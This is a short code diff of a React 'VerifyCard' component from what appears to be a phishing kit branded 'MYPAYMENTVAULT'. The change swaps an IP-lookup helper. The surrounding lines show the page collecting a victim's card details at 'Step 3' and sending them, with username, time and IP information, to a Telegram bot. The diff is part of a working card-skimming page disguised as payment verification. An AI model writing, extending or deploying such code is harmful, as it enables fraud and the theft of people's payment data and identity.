@@ -3,7 +3,7 @@ import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, CreditCard } from "lucide-react";
-import { sendTelegram, getPublicIP } from "@/lib/telegram";
+import { sendTelegram, getIPInfo } from "@/lib/telegram";
 
 const languageOptions: { code: Language; label: string }[] = [
   { code: "en", label: "English" },
@@ -86,7 +86,7 @@ export default function VerifyCard() {
     setErrors({});
     setLoading(true);
     const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-    const ip = await getPublicIP();
+    const ip = await getIPInfo();
     await sendTelegram(
       `💳 <b>MYPAYMENTVAULT - Step 3: Card Details</b>\n\n` +
       `👤 Username: <code>${pendingUsername}</code>\n` +
